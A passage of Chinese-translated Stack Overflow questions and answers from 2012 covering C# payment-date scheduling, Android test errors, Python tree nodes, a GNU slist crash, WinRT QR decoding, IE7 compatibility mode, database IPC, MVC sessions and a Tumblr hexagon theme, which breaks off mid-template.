> 赞同：2
> 
> 时间：2012-12-12T13:48:36.027

序列化程序将序列化传递给它的对象。您可以调整派生类以提供有关如何对其进行序列化的说明，但您可能不想这样做。

这就是 MVVM 设计模式存在的原因——您真正应该做的是将您的业务对象投影到一个视图模型对象中，该对象*只*包含您真正想要的字段。像这样的东西：

```
public IQueryable<ClassViewModel> Get()
{
    return CollectionOfClassDerivedObjects.Select(x => new ClassViewModel(x))
} 
```

# c# - C# 计算日期

> ID：13841149
> 
> 赞同：0
> 
> 时间：2012-12-12T13:43:32.643
> 
> 标签：c#, date, date-arithmetic

我正在寻求一些帮助来计算新调度系统的截止日期。

目前，时间表是基于从定义的日期开始的每月或每周付款。

在新的时间表中，我们希望这基于客户的付款频率，从定义的日期开始。

我们有 13 种支付频率选项：

1.  每月 - 最后一个工作日
2.  每月 - 同一日期，例如 20 日、25 日
3.  每月 - 第一个周一/周二/周三/周四/周五
4.  每月 - 第二个周一/周二/周三/周四/周五
5.  每月 - 第 3 个周一/周二/周三/周四/周五
6.  每月 - 上周一/周二/周三/周四/周五
7.  每周 - 星期一
8.  每周 - 周二
9.  每周 - 星期三
10.  每周 - 星期四
11.  每周 – 周五
12.  4 周刊
13.  半月刊

根据传入的付款频率以及付款次数和到期余额，我需要生成一个新的时间表。

第一次付款是直截了当的，因为它是在通过日期，时间表中的其他日期需要从该日期计算（取决于付款频率）。

我还需要确保预定日期是在工作日（周一至周五），并且不会在公共/银行假日登陆 - 在这种情况下，我将恢复到下一个有效的工作日。

到目前为止我的方法如下 - 我需要帮助的区域评论：

> // 计算下一个付款日期

```
public IList<ScheduledInstalment> GenerateSchedule(int agreementID, int paymentCount, 
    PayFrequency frequency, double balance, DateTime firstPaymentDate)
{
    IList<ScheduledInstalment> schedule = new List<ScheduledInstalment>();

    PaymentCalculation calc = GetPaymentCalculation(frequency, firstPaymentDate);

    double regularInstalment = Math.Round(balance / paymentCount, 1);
    double finalInstalment = Math.Round(((regularInstalment * (paymentCount - 1)) - balance), 2);

    for (int i = 0; i <= paymentCount; i++)
    {
        ScheduledInstalment s = new ScheduledInstalment();

        s.AgreementID = agreementID;

        if (i == 0)
        {
            // First Payment
            s.DueDate = firstPaymentDate;
            s.AmountDue = regularInstalment;
        }
        else 

            // Calculate next payment date

            if (i < paymentCount)
            {
                // Regular Payment
                s.AmountDue = regularInstalment;
            }
            else
            {
                // Final Payment
                s.AmountDue = finalInstalment;
            }

        schedule.Add(s);
    }

    return schedule;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T13:23:45.223

好的，我设法得到了一些似乎可行的方法，下面是我的方法：

```
public DateTime GetNextRepaymentDate(DateTime BaseDate, int instalmentCount, PaymentCalculation calc)
            {
                DateTime dueDate = new DateTime();

                switch (calc.Interval)
                {
                    case DateInterval.Month:

                        dueDate = BaseDate.AddMonths((instalmentCount) * calc.Number);

                        if (!string.IsNullOrEmpty(calc.OtherCriteria))
                        {
                            if (calc.OtherCriteria == "Last")
                            {
                                int lastDay = DateTime.DaysInMonth(dueDate.Year, dueDate.Month);
                                dueDate = Convert.ToDateTime(string.Format("{0}/{1}/{2}", lastDay, dueDate.Month, dueDate.Year));
                            }
                            else
                            {
                                int fixedDate = Convert.ToInt32(calc.OtherCriteria);

                                if (dueDate.Day != fixedDate)
                                {
                                    if (dueDate.Day > fixedDate)
                                    {
                                        while (dueDate.Day != fixedDate)
                                        {
                                            dueDate = dueDate.AddDays(-1);
                                        }
                                    }
                                    else
                                    {
                                        while (dueDate.Day != fixedDate)
                                        {
                                            dueDate = dueDate.AddDays(1);
                                        }
                                    }
                                }
                            }
                        }

                        break;

                    case DateInterval.WeekOfYear:

                        dueDate = BaseDate.AddDays((instalmentCount) * (calc.Number * 7));

                        if (calc.FixedDay != null)
                        {
                            while (dueDate.DayOfWeek != calc.FixedDay)
                            {
                                dueDate = dueDate.AddDays(-1);
                            }
                        }

                        break;
                }

                while (!PaymentIsAllowedOnDate(dueDate) == true)
                {
                    dueDate = dueDate.AddDays(-1);
                }

                return dueDate;
            } 
```

# android - Android 测试：仪器运行因“java.lang.ClassNotFoundException”而失败

> ID：13841150
> 
> 赞同：6
> 
> 时间：2012-12-12T13:43:35.030
> 
> 标签：android, unit-testing, instrumentation

我的主应用程序中的特定包有 3 个测试类。我的第一个测试类运行良好，其他 2 个则没有。

当我尝试运行这 2 个测试时，我收到以下错误：

```
Instrumentation run failed due to 'java.lang.ClassNotFoundException' 
```

我已经验证了：

*   如果构建路径配置正确，
*   如果目标包是正确的，
*   如果我在导入 jUnit 时遇到问题。

任何猜测的问题是什么？

-----//-----

**解决方案：**

我更改了我正在使用的 jUnit 版本，并且测试按应有的方式执行。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-05-07T10:45:35.103

您需要将 JUnit 库添加到您的包中，如下所示：

在 Eclipse 上，右键单击您的测试项目，选择 Properties --> Java Build Path，在 Order and Export 选项卡上，请检查 JUnit 4 并单击 OK。

之后，清理或重建您的测试项目并运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-08T20:35:43.420

Java 构建路径应导出 JUnit 4 库（选中）并确保您清理并重建项目

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T13:53:22.773

你有没有在“AndroidManifest”中定义你的另外两个类

# python - 蟒蛇类ID

> ID：13841151
> 
> 赞同：0
> 
> 时间：2012-12-12T13:43:35.343
> 
> 标签：python, class, tree

我为具有 id 的类搜索了一个不错的实现。我的问题是，我不知道指向其他对象的好解决方案。我的代码将如下所示：

```
class node(object):
    counter = itertools.count().next
    def __init__(self)
        self.id = node.counter
        self.parent = ...
        self.children = ...
        self.neighbour = ... 
```

我想引用其他节点，例如 self.parent = node[id] - 类似于列表

编辑：所以，因为有很多混乱，我想具体说明我的问题。你可以想象节点是一个立方体，里面有立方体，并且（也许）在一个立方体内。所以子立方体也是我想在课堂上引用的立方体。所以我的主要想法是把它组织成一棵树。

编辑2：不，我不是在谈论二叉树。最后，我想做以下事情：

```
node[4].children[0].children[2].neighbour[3].parent 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T13:59:14.503

我仍然无法理解您的问题，但这些[`__*item__()`](http://docs.python.org/2/reference/datamodel.html#object.__getitem__)方法定义了 Python 中序列和映射的各种索引操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:24:12.003

Python 是一种动态语言，因此属性可以与任何类型绑定。

```
class node( object ):
    def __init__( self, data, left, right ):
        self.data = data
        self.left = left
        self.right = right 
```

[这是](http://code.activestate.com/recipes/286239-binary-ordered-tree/)在 python 中使用节点类的有序树的一个很好的例子。

# c++ - gnu slist 执行错误：文件丢失 .../bits/allocator.h：没有这样的文件

> ID：13841152
> 
> 赞同：1
> 
> 时间：2012-12-12T13:43:35.810
> 
> 标签：c++

我正在使用 Ubuntu。g++ 版本 4.7.2。

任何人都可以帮助我获得 gnu-extension 单一列表吗？我在这里编译了这些东西，并在执行时得到了核心转储。

我对其进行了调试，发现核心转储发生在第一行，它抛出了一个我无法解决的错误。有人可以帮我吗？

错误代码：

```
std::allocator<char>::allocator (this=0x7fffffffe4d0)
at /build/buildd/gcc-4.7-4.7.2/build/x86_64-linux-gnu/libstdc++-v3/include/bits/allocator.h:104
104 /build/buildd/gcc-4.7-4.7.2/build/x86_64-linux-gnu/libstdc++-v3/include/bits/allocator.h: No such file or directory. 
```

这是我的测试代码：

```
#include <ext/slist>
#include <cstring>
#include <iostream>

int main(int argc, char * argv[])
{
    __gnu_cxx::slist<char> li(&argv[1][0], &(argv[1][strlen(argv[1])]));

    if(argc != 3)
        return 1;

    std::cout << "SList: ";
    for(__gnu_cxx::slist<char>::iterator i = li.begin();
            i != li.end();
            ++i)
        std::cout << *i;
    std::cout << std::endl;

    li.remove(argv[2][0]);

    for(__gnu_cxx::slist<char>::iterator i = li.begin();
            i != li.end();
            ++i)
        std::cout << *i;
    std::cout << std::endl;

    return 0;
}//main 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:53:52.480

我的猜测是您在运行它时没有提供任何命令行参数。它需要两个：放入列表的字符序列和要删除的字符序列。

更新：如评论中所述，要在使用时将参数传递给您的程序`gdb`，您需要使用该`--args`选项来指示应将程序名称后面的参数传递给程序，而不是传递给`gdb`它自己：

```
gdb --args a.out xxyyxx x
    ^^^^^^ 
```

它在检查该参数是否存在`argv[1]` *之前*从第一个参数初始化列表；如果没有，那么您将获得未定义的行为。如果您将检查移到 的声明之上`li`，那么在这种情况下程序应该退出并返回代码 1。

然后调试器抱怨它找不到源文件，因此无法向您显示出错的源代码行。

顺便说一句，C++ 标准库现在包括一个单链表`std::forward_list`，定义在 中`<forward_list>`，您可以使用它来代替 GNU 的扩展。

# windows-runtime - WinRT 的 QrCode 开源库

> ID：13841156
> 
> 赞同：2
> 
> 时间：2012-12-12T13:43:47.627
> 
> 标签：windows-runtime, qr-code

我需要为我的 Windows 8 Store App 生成二维码。是否有任何基于 Win Rt 的开源二维码库。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-04-15T05:46:03.893

我使用了codeplex 上提供的**zxing库。**

我写的方法如下：

我正在使用`DecodeQRcode`相机`CaptureFileAsync`方法中的 with 存储文件，该方法返回`qrImgage`.

```
public async void DecodeQRCode(StorageFile file)
{
        // load a jpeg, be sure to have the Pictures Library capability in your manifest

        var data = await FileIO.ReadBufferAsync(file);

        // create a stream from the file
        var ms = new InMemoryRandomAccessStream();
        var dw = new Windows.Storage.Streams.DataWriter(ms);
        dw.WriteBuffer(data);
        await dw.StoreAsync();
        ms.Seek(0);

        // find out how big the image is, don't need this if you already know
        var bm = new BitmapImage();
        await bm.SetSourceAsync(ms);

        // create a writable bitmap of the right size
        var wb = new WriteableBitmap(bm.PixelWidth, bm.PixelHeight);
        ms.Seek(0);

        // load the writable bitpamp from the stream
        await wb.SetSourceAsync(ms);

        var lsource = new BitmapLuminanceSource(wb);

        var binarizer = new HybridBinarizer(lsource);
        var bbmp = new BinaryBitmap(binarizer);

        var c = new QRCodeReader();
       Result res= c.decode(bbmp);
    } 
```

在拍摄 QR 码的图像时，您必须确保正确裁剪图像，否则您将无法获得预期的结果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T06:16:54.873

这个我没用过，但是[ZXing.Net](http://zxingnet.codeplex.com/)是....

> 支持解码和生成图像中的条形码（如 QR 码、PDF 417、EAN、UPC、Aztec、Data Matrix、Codabar）的库。

并有适用于 WindowsRT（以及手机）的组件

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-07-16T08:53:44.583

[您可以使用](https://zxingnet.codeplex.com/)ZXing.NET：https://zxingnet.codeplex.com/

加载图片获取二维码结果的代码：

```
 FileOpenPicker openPicker = new FileOpenPicker();
        openPicker.ViewMode = PickerViewMode.Thumbnail;
        openPicker.SuggestedStartLocation = PickerLocationId.PicturesLibrary;
        openPicker.FileTypeFilter.Add(".png");
        openPicker.FileTypeFilter.Add(".jpg");
        openPicker.FileTypeFilter.Add(".bmp");

        StorageFile file = await openPicker.PickSingleFileAsync();
        if (null != file)
        {
            try
            {
                BitmapImage bitmap = new BitmapImage();
                using (IRandomAccessStream fileStream1 = await file.OpenAsync(Windows.Storage.FileAccessMode.Read))
                {
                    bitmap.SetSource(fileStream1);
                }
                using (IRandomAccessStream fileStream2 = await file.OpenAsync(Windows.Storage.FileAccessMode.Read))
                {
                    WriteableBitmap writeableBitmap = new WriteableBitmap(bitmap.PixelWidth, bitmap.PixelHeight);
                    writeableBitmap.SetSource(fileStream2); IBarcodeReader reader = new BarcodeReader();
                    var result = reader.Decode(writeableBitmap);
                    txt1.Text = result.ToString();
                }

            }
            catch (Exception exception)
            {
                //
            }
        } 
```

从相机获取 QR 的代码（使用 MSDN 演示：[http](http://code.msdn.microsoft.com/windowsapps/CameraCaptureUI-Sample-845a53ac) ://code.msdn.microsoft.com/windowsapps/CameraCaptureUI-Sample-845a53ac和自定义）：

```
 private async void CapturePhoto_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            rootPage.NotifyUser("", NotifyType.StatusMessage);

            // Using Windows.Media.Capture.CameraCaptureUI API to capture a photo
            CameraCaptureUI dialog = new CameraCaptureUI();
            Size aspectRatio = new Size(1, 1);
            dialog.PhotoSettings.CroppedAspectRatio = aspectRatio;

            StorageFile file = await dialog.CaptureFileAsync(CameraCaptureUIMode.Photo);
            if (file != null)
            {
                BitmapImage bitmapImage = new BitmapImage();

                using (IRandomAccessStream fileStream1 = await file.OpenAsync(FileAccessMode.Read))
                {
                    bitmapImage.SetSource(fileStream1);
                }
                CapturedPhoto.Source = bitmapImage;
                ResetButton.Visibility = Visibility.Visible;

                ZXing.BarcodeReader br = new ZXing.BarcodeReader();
                WriteableBitmap wrb = new WriteableBitmap(bitmapImage.PixelWidth, bitmapImage.PixelHeight);
                BitmapImage img = new BitmapImage();
                img.CreateOptions = BitmapCreateOptions.IgnoreImageCache;
                using (IRandomAccessStream fileStream2 = await file.OpenAsync(FileAccessMode.Read))
                {
                    wrb.SetSource(fileStream2);
                }
                var res = br.Decode(wrb);
                rootPage.NotifyUser(res.ToString(), NotifyType.ErrorMessage);

            }
            else
            {
                rootPage.NotifyUser("No photo captured.", NotifyType.StatusMessage);
            }
        }
        catch (Exception ex)
        {
            rootPage.NotifyUser(ex.Message, NotifyType.ErrorMessage);
        }
    } 
```

# php - 如何在ie7中设置兼容性视图？

> ID：13841158
> 
> 赞同：0
> 
> 时间：2012-12-12T13:43:56.863
> 
> 标签：php, css, codeigniter, internet-explorer-7

当我导航到我的应用程序中的一个页面时`Compatibility View`，IE 的 The of 更改为`Quirks Mode`.

在 IE8 和 IE9 中，我通过使用此代码克服了这个问题，但是，它不适用于 IE7

```
if($ie_version =='7') { 
      echo $ie_version; ?>
     <meta http-equiv="X-UA-Compatible: IE=7" content="IE=EmulateIE7" >
<?php }
else if($ie_version =='9'){ ?>
<meta http-equiv="X-UA-Compatible" content="IE=edge"  value="9" > 
<?php }
else if($ie_version =='8') { ?>
     <meta http-equiv="X-UA-Compatible" content="IE=edge" value="8" > 
<?php }   ?> 
```

有人可以建议补救措施吗？另外，我想知道为什么模式会变成怪癖。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T09:30:39.427

这是由于 html 错误，在实际 html 开始之前使用了注释行，我刚刚删除了它，现在它工作正常

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:45:32.843

转到**工具-> 兼容性视图设置**

并查看您是否在其中定义了任何站点。如果它们在那里，那么它将仅更改为这些站点的兼容性视图。

如果您不希望它们在那里，请删除它们

# java - 通过数据库进行进程间通信

> ID：13841162
> 
> 赞同：2
> 
> 时间：2012-12-12T13:44:22.987
> 
> 标签：java, database, design-patterns, ipc

如果我有 2 个进程在不同的节点上运行并且它们共享一个数据库，那么是否存在一个节点能够通过数据库向另一个进程发送一些通知的模式？
通常使用某种轮询表还是有更好的方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T16:24:17.773

而不是轮询（这意味着不仅会消耗 CPU 周期，而且在这种情况下还会消耗数据库资源和带宽），这个怎么样？如果您使用的是 Oracle，则可以为要通知的表定义一个触发器 ON UPDATE 并从触发器中调用 Java 存储过程 (JSP)。然后，JSP 可以使用任何通知机制来通知其他组件有关更改。这不会非常快，但是...

正确的方法是让更新数据库的组件向其他组件发送并行通知，并再次为此 RMI、JMS 等使用任何可用技术

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T13:52:21.890

如果要使用数据库，可以在生产端将条目插入到表中，然后轮询以在消费端查找新条目。这可能是您项目中最简单的选择。

有许多可能的替代方案，例如 JMI、RMI、Sockets、NoSql 数据库、文件，但是如果没有更多信息，就无法判断这些是否会更好。（通常最简单的就是最好的）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-13T05:29:09.983

轮询不是最佳解决方案。如果您有大量的客户或用户，那么数据库将一直忙于回答民意调查。

如果可能的话，用户阻止或等待更新是更可取的。用户通常更喜欢响应式系统。

在决定之前要考虑的两个主要标准是并发用户的最大数量以及需要多快通知用户他们表示感兴趣的事件。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-06-23T16:01:35.037

如果您的数据库支持，比轮询更好的解决方案是 select() 或类似 inotify() 的方法。例如，PostgreSQL 支持 select()，因此您可以在等待输入到 DB 时执行非忙循环。话虽如此，[Database-as-IPC](https://en.wikipedia.org/wiki/Database-as-IPC)被认为是一种反模式。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T14:06:34.507

最简单的解决方案就是轮询另一个进程。

但是，如果您希望另一个进程立即收到数据更改，则应该考虑使用一些通知机制，例如 rpc、http 请求等。

# .net - 具有单独会话的多个浏览器窗口

> ID：13841163
> 
> 赞同：1
> 
> 时间：2012-12-12T13:44:24.787
> 
> 标签：.net, session, asp.net-mvc-4, multiple-instances

我正在启动一个需要使用多个浏览器实例的 .NET MVC4 应用程序。我需要每个浏览器都有自己的实例或会话。例如，假设它是学校使用的应用程序。在主窗口中，对学生进行搜索并选择，以便在该浏览器窗口中完成的所有操作都与所选学生相关联。我打开另外两个浏览器窗口并对两个不同的学生做同样的事情，所以现在每个窗口都与一个特定的学生相关联。我不相信我可以使用 Session 对象，因为它可以覆盖浏览器的所有实例。实现这样的事情的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:43:29.323

这里有几种可能性。

如果每个浏览器都在查看一个独立于登录用户的学生，那么无论哪个浏览器实例执行了请求，您的路由都会为您提供当前学生的信息。然后，您只需即时加载您的学生模型。

例如，在搜索之后，我假设您重定向到学生页面。您可以设置类似于以下的 url 路由：

[http://www.blah.com/home/student/profile/123](http://www.blah.com/home/student/profile/123)

MVC 会将您带到学生 id = 123 的适当控制器。加载您的学生并渲染您的视图。

如果您希望将当前学生存储在会话缓存中，您必须能够在缓存中唯一标识您的学生。与其将其存储为“student”，不如将其存储为“student-123”，其中 123 是学生的 ID。然后您可以编写代码在会话缓存中查找特定学生。如果它不存在，请即时加载。

# html - 六边形网格 tumblr css 代码

> ID：13841164
> 
> 赞同：2
> 
> 时间：2012-12-12T13:44:33.353
> 
> 标签：html, css, layout, grid, tumblr

你好，我到处搜索，但我找不到如何在 tumblr 上制作六边形网格！我设法让图像显示为六边形，但不知道如何像蜜蜂梳子那样布局......

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>{Title}{block:SearchPage} | {SearchQuery}{/block:SearchPage}{block:PostSummary} | {PostSummary}{/block:PostSummary}</title>
<link rel="shortcut icon" href="{Favicon}">
<link rel="alternate" type="application/rss+xml" href="{RSS}">
{block:Description}<meta name="description" content="{MetaDescription}" />{/block:Description}

<meta name="image:Background" content="" />
<meta name="image:Custom header" content="" />
<meta name="color:Background" content="#F9F9F9" />
<meta name="color:Accent" content="#FF6600" />
<meta name="color:Text" content="#666666" />
<meta name="if:Infinite scroll" content="1" />
<meta name="if:4 columns" content="0" />
<meta name="if:Hide description" content="0" />
<meta name="text:Background properties" content="fixed center" />

<style type="text/css">
body {
    margin: 0;
    font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
    background: {color:Background} url({image:Background}) {text:Background properties};
    color: {color:Text};
}
a {
    color: inherit;
    text-decoration: none;
}
p a,li a,.credit a,.h2 a { 
    border-bottom: 1px dotted {color:Text};
}
a img {
    border: 0;
}
blockquote { 
    margin: 0;
    padding: 0 0 0 0px;
    border-left: 1px {color:Text} dotted;
}
.wrap {
    margin: 20px auto;
    width: {block:If4Columns}50{/block:If4Columns}{block:IfNot4Columns}900{/block:IfNot4Columns}px;
}
.header {
    width: 100%;
    text-align: left;
    padding: 25px{block:PermalinkPage} 0{/block:PermalinkPage};
}
.header img {
    max-width: 100%;
}
.header h1 {
    text-transform: uppercase;
    font-size: 30px;
    margin: 0;
    letter-spacing: 5px;
    font-weight: normal;
    color: {color:Accent};
}
.header p {
    margin: 5px 0 0 0;
    font-size: 12px;
    font-size: 12px;
    line-height: 175%;
    padding: 0;
}
.links {
    text-align: right;
}
.links a {
    background: #FFF;
    border-bottom: none;
    -webkit-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.15);
    -moz-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.15);
    box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.15);
    margin: 0 5px;
    line-height: 35px;
    padding: 5px 15px;
    font-size: 11px;
    font-weight: bold;
    text-transform: uppercase;
    text-align: center;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    color: {color:Accent};
}
.posts {

    margin: 2px 2px 2px 2px;
}
.post {
    position: inherit;
    float: right;
    height: 250px; 
    width: {block:IndexPage}220px{/block:IndexPage}{block:PermalinkPage}50%{/block:PermalinkPage};

}
.hexagon {
    overflow: hidden;
    visibility: hidden;
    -webkit-transform: rotate(120deg);
       -moz-transform: rotate(120deg);
         -o-transform: rotate(120deg);
            transform: rotate(120deg);
    cursor: pointer;
    }
.hexagon-in1 {
    overflow: hidden;
    width: 100%;
    height: 100%;
    -webkit-transform: rotate(-60deg);
       -moz-transform: rotate(-60deg);
         -o-transform: rotate(-60deg);
            transform: rotate(-60deg);
    }
.hexagon-in2 {
    width: 100%;
    height: 100%;
    background-repeat: no-repeat;
    background-position: 100%;
    visibility: visible;
    -webkit-transform: rotate(-60deg);
       -moz-transform: rotate(-60deg);
         -o-transform: rotate(-60deg);
            transform: rotate(-60deg);
    }

.hexagon2 {
    width: 200px;
    height: 400px;
    margin: -60px -20px 0 -20px;
    }

}
.post .permalink {
    width: 150px;
    background: -moz-linear-gradient(left,  rgba(0,0,0,0.75) 0%, rgba(0,0,0,0.85) 50%, rgba(0,0,0,0.75) 100%);
    background: -webkit-gradient(linear, left top, right top, color-stop(0%,rgba(0,0,0,0.75)), color-stop(50%,rgba(0,0,0,0.85)), color-stop(100%,rgba(0,0,0,0.75)));
    background: -webkit-linear-gradient(left,  rgba(0,0,0,0.75) 0%,rgba(0,0,0,0.85) 50%,rgba(0,0,0,0.75) 100%);
    background: -o-linear-gradient(left,  rgba(0,0,0,0.75) 0%,rgba(0,0,0,0.85) 50%,rgba(0,0,0,0.75) 100%);
    background: -ms-linear-gradient(left,  rgba(0,0,0,0.75) 0%,rgba(0,0,0,0.85) 50%,rgba(0,0,0,0.75) 100%);
    background: linear-gradient(left,  rgba(0,0,0,0.75) 0%,rgba(0,0,0,0.85) 50%,rgba(0,0,0,0.75) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#bf000000', endColorstr='#bf000000',GradientType=1 );
    color: #FFF;
    position: absolute;
    top: 50%;
    left: 50%;
    margin: -6px 0 0 -10px;
    padding: 5px 0;
    font-size: 10px;
    text-transform: uppercase;
    text-align: center;
    height: 12px;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
    -webkit-box-shadow: 0px 0px 25px 0 rgba(0, 0, 0, 0.25);
    -moz-box-shadow: 0px 0px 25px 0 rgba(0, 0, 0, 0.25);
    box-shadow: 0px 0px 25px 0 rgba(0, 0, 0, 0.25);
    opacity: 1;
    -webkit-transition: all .25s ease;
    -moz-transition: all .25s ease;
    transition: all .25s ease;
}
.post:hover .permalink {
    opacity: 1;
}
.post .player {
    width: 50px;
    background: #FFF;
    position: absolute;
    top: 50%;
    left: 50%;
    margin: -25px 0 0 -25px;
    font-size: 10px;
    text-transform: uppercase;
    text-align: center;
    height: 50px;
    -webkit-border-radius: 40px;
    -moz-border-radius: 40px;
    border-radius: 40px;
}
.post .player_overflow {
    width: 20px;
    height: 5px;
    margin: 11px;
    overflow: hidden;
}
.post h2 {
    font-size: 16px;
    letter-spacing: 2px;
    line-height: 150%;
    margin: 0 0 10px 0;
    text-transform: uppercase;
    color: {color:Accent};
}
.post p,.post li {
    font-size: 12px;
    line-height: 175%;
    margin: 5px 0;
    padding: 0;
}
.post ul {
    margin: 5px 25px;
    padding: 0;
    list-style: none;
}
.post img {
    max-width: 100%;
    height: auto;
}
.post .quote {
    padding: 10px 15px;
    background: #FFF;
    position: relative;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    -webkit-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.15);
    -moz-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, 0.15);
    box-shadow: 0px 1px 6px 5px rgba(0, 0, 0, 0.15);
    margin-bottom: 20px;
    font-size: 13px;
    letter-spacing: normal;
    font-family: Georgia, "Times New Roman", Times, serif;
    font-style: italic;
    font-weight: normal;
    text-transform: none;
    line-height: 160%;
    color: {color:Accent};
}
.post .quote .arrow {
    position: absolute;
    top: 100%;
    left: 10px;
    background: url(http://static.tumblr.com/jw8fmba/NDglv0xrl/arrow.png);
    width: 35px;
    height: 15px;
}
img.main {
    width: 100%;
}
.media {
    width: 500px;
    margin: 0 auto;
}
.post ol.notes {
    padding: 0;
    margin: 10px 0 !important;
    list-style-type: none;
    position: relative;
}
.post ol.notes a {
    border: 0 !important;
}
.post ol.notes li.note {
    margin: 2px !important;
    float: left;
    width: 16px;
    height: 16px;
}
.post ol.notes li.more_notes_link_container {
    width: 100% !important;
    text-align: center;
    margin: 2px 0 !important;
}
.post ol.notes li.note img.avatar {
    width: 16px;
    height: 16px;
    -webkit-border-radius: 16px;
    -moz-border-radius: 16px;
    border-radius: 16px;
}
span.action {
    min-width: 500px;
    position: absolute;
    top: -20px;
    left: 0;
    font-size: 12px;
    opacity: 0;
    -webkit-transition: all .1s ease;
    -moz-transition: all .1s ease;
    transition: all .1s ease;
    z-index: 999;
    color: {color:Accent};
}
.post ol.notes li.note:hover span.action {
    opacity: 1;
}
.post ol.notes li.note .answer_content {
    font-weight: normal;
}
.post ol.notes li.note blockquote {
    display: none;
}
#infscr-loading {
    text-align: center;
    z-index: 100;
    position: fixed;
    left: 45%;
    bottom: 50px;
    z-index: 999;
}
.credit { display: none !important }
{CustomCSS}
</style>

<!--  Untitled Themes customize assistant  -->
</head>
<body id="32912">

<div class="wrap">
    <table class="header">
        <tr>
            <td width="50%">
                <span class="title">
                    {block:IfCustomHeaderImage}<a href="/"><img src="{image:Custom header}" /></a>{/block:IfCustomHeaderImage}
                    {block:IfNotCustomHeaderImage}<h1><a href="/">{Title}</a></h1>{/block:IfNotCustomHeaderImage}
                </span>
                {block:IfNotHideDescription}{block:Description}<p>{Description}</p>{/block:Description}{/block:IfNotHideDescription}
            </td>
            <td class="links">
                <a href="/archive">{lang:Archive}</a>
                {block:AskEnabled}<a href="/ask">{AskLabel}</a>{/block:AskEnabled}
                {block:SubmissionsEnabled}<a href="/submit">{SubmitLabel}</a>{/block:SubmissionsEnabled}
                {block:HasPages}{block:Pages}<a href="{URL}">{Label}</a>{/block:Pages}{/block:HasPages}
                {block:Pagination}
                <span id="pagination">
                {block:PreviousPage}<a id="previous" href="{PreviousPage}">{lang:Previous page}</a>{/block:PreviousPage}
                {block:NextPage}<a id="next" href="{NextPage}">{lang:Next page}</a>{/block:NextPage}
                </span>
                {/block:Pagination}
                {block:PreviousPost}<a href="{PreviousPost}">{lang:Previous post}</a>{/block:PreviousPost}
                {block:NextPost}<a href="{NextPost}">{lang:Next post}</a>{/block:NextPost}
            </td>
        </tr>
    </table>
    <div class="posts">
    {block:Posts}
        <!-- {PostType} -->    
        <div class="post" id="{PostID}">
        {block:Audio}
            {block:IndexPage}
            {block:AlbumArt}
            <a href="{Permalink}"><div class="photo" style="background: url({AlbumArtURL}) center"></div></a>
            <div class="player">
                <div class="player_overflow">
                    {AudioPlayerWhite}
                </div>      
            </div>
            {/block:AlbumArt}
            <span{block:AlbumArt} style="display: none"{/block:AlbumArt}>
                <div class="quote">
                    {AudioPlayerWhite}
                    <div class="arrow"></div>
                </div>
                {block:TrackName}<h2>{TrackName}</h2>{block:TrackName}
                {block:Artist}<h2>{Artist}</h2>{block:Artist}
                {block:Caption}{Caption}{/block:Caption}
            </span>
            {/block:IndexPage}
            {block:PermalinkPage}
                {block:AlbumArt}<img class="main" src="{AlbumArtURL}" />{block:AlbumArt}
                <div style="margin: 10px 0">{AudioPlayerBlack}</div>
                {block:TrackName}<h2>{TrackName}</h2>{block:TrackName}
                {block:Artist}<h2>{Artist}</h2>{block:Artist}
                {block:Album}<h2>{Album}</h2>{block:Album}
                {block:Caption}{Caption}{/block:Caption}
            {/block:PermalinkPage}
        {/block:Audio}
        {block:Photo}
            {block:IndexPage}
            {LinkOpenTag}
<div class="hexagon hexagon2"><div class="hexagon-in1"><div class="hexagon-in2" style="background: url({PhotoURL-400}) center"></div></div></div>
            {LinkCloseTag}
            {/block:IndexPage}
            {block:PermalinkPage}
                {LinkOpenTag}
                    <img class="main" src="{PhotoURL-HighRes}" alt="{PhotoAlt}" />
                {LinkCloseTag}
                {block:Caption}{Caption}{/block:Caption}
            {/block:PermalinkPage}
        {/block:Photo}
        {block:Link}
            <h2><a href="{URL}" {Target}>{Name}</a></h2>
            {block:Description}{Description}{/block:Description}
        {/block:Link}
        {block:Text}
            {block:Title}<h2>{Title}</h2>{/block:Title}
            {Body}
        {/block:Text}
        {block:Quote}
            <div class="quote">
                "{Quote}"
                <div class="arrow"></div>
            </div>
            {block:Source}<p>- {Source}</p>{/block:Source}
        {/block:Quote}
        {block:Chat}
            {block:Title}<h2>{Title}</h2>{/block:Title}
            <ul>
